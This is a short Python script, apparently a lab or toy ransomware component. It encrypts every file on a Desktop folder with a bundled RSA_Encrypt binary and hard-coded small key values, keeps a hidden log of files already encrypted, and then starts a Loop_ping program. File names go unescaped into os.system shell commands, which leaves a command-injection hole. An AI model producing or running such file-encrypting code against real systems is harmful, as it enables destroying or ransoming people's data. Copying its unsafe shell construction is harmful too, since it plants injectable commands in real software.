import os
from os import listdir
from os.path import isfile, join
dire=os.path.dirname(os.path.abspath(__file__))
encrypted=(open('/home/attacker/.attackrecord/record.log').readlines())
onlyfiles=[f for f in listdir('/home/attacker/Desktop') if isfile(join('/home/attacker/Desktop',f))]
for f in onlyfiles:
    tmp=""
    tmp+=f
    tmp+='\n'
    if tmp not in encrypted:
        command=dire
        command+='/RSA_Encrypt -C 126419 30743 /home/attacker/Desktop/'
        command+=f
        os.system(command)
        open('/home/attacker/.attackrecord/record.log','a').writelines(f)
        open('/home/attacker/.attackrecord/record.log','a').writelines('\n')
ping=dire
ping+='/Loop_ping'
os.system(ping)